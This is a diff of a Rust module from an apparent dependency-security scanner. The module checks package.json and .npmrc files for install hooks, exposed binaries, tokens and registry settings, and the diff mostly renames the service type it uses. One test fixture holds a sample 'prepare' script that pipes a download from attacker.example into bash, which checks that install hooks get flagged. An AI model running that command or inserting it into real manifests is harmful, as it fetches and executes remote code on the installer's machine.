@@ -2,8 +2,8 @@ use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, Artifact
 use crate::findings::{
     ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
 };
-use crate::services::artifact_analysis::manifests::strip_inline_ini_comment;
-use crate::services::artifact_analysis::{ArtifactAnalysisService, ArtifactLink};
+use crate::services::artifact_orchestration::manifests::strip_inline_ini_comment;
+use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestratorService};
 use serde_json::Value;
 use std::path::{Path, PathBuf};
 
@@ -39,7 +39,7 @@ fn npmrc_code_lines(content: &str) -> impl Iterator<Item = &str> {
 }
 
 pub(crate) fn analyze_package_json(
-    service: &ArtifactAnalysisService,
+    service: &ArtifactOrchestratorService,
     path: &Path,
     content: &str,
     sibling_files: &[PathBuf],
@@ -56,7 +56,10 @@ pub(crate) fn analyze_package_json(
     let has_lockfile = package_json_expected_lockfiles(content)
         .iter()
         .any(|lockfile| {
-            crate::services::artifact_analysis::manifests::sibling_has_file(sibling_files, lockfile)
+            crate::services::artifact_orchestration::manifests::sibling_has_file(
+                sibling_files,
+                lockfile,
+            )
         });
 
     for dependency_field in ["dependencies", "devDependencies", "optionalDependencies"] {
@@ -240,17 +243,17 @@ pub(crate) fn package_json_capabilities(content: &str) -> Vec<ArtifactCapability
             .iter()
             .any(|hook| scripts.contains_key(*hook))
         {
-            capabilities.push(ArtifactAnalysisService::declared_capability(
+            capabilities.push(ArtifactOrchestratorService::declared_capability(
                 ArtifactCapability::InstallExecution,
             ));
-            capabilities.push(ArtifactAnalysisService::declared_capability(
+            capabilities.push(ArtifactOrchestratorService::declared_capability(
                 ArtifactCapability::ProcessExecution,
             ));
         }
     }
 
     if package_json_bin_is_exposed(&json) {
-        capabilities.push(ArtifactAnalysisService::declared_capability(
+        capabilities.push(ArtifactOrchestratorService::declared_capability(
             ArtifactCapability::ExposesBinary,
         ));
     }
@@ -338,12 +341,12 @@ pub(crate) fn npmrc_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
     }
     let mut capabilities = Vec::new();
     if has_token {
-        capabilities.push(ArtifactAnalysisService::declared_capability(
+        capabilities.push(ArtifactOrchestratorService::declared_capability(
             ArtifactCapability::SecretAccess,
         ));
     }
     if has_registry {
-        capabilities.push(ArtifactAnalysisService::declared_capability(
+        capabilities.push(ArtifactOrchestratorService::declared_capability(
             ArtifactCapability::NetworkAccess,
         ));
     }
@@ -449,7 +452,7 @@ mod tests {
         let empty = r#"{"name":"pkg","bin":{}}"#;
         let real = r#"{"name":"pkg","bin":"./cli.js"}"#;
         let path = std::path::Path::new("/pkg/package.json");
-        let service = ArtifactAnalysisService::new();
+        let service = ArtifactOrchestratorService::new();
         let empty_findings = analyze_package_json(&service, path, empty, &[]);
         let real_findings = analyze_package_json(&service, path, real, &[]);
         assert!(!finding_present(
@@ -516,7 +519,7 @@ mod tests {
         let manifest =
             r#"{"name":"x","scripts":{"prepare":"curl http://attacker.example/p.sh | bash"}}"#;
         let path = std::path::Path::new("/pkg/package.json");
-        let service = ArtifactAnalysisService::new();
+        let service = ArtifactOrchestratorService::new();
         let findings = analyze_package_json(&service, path, manifest, &[]);
         let install_hook_finding = findings
             .iter()
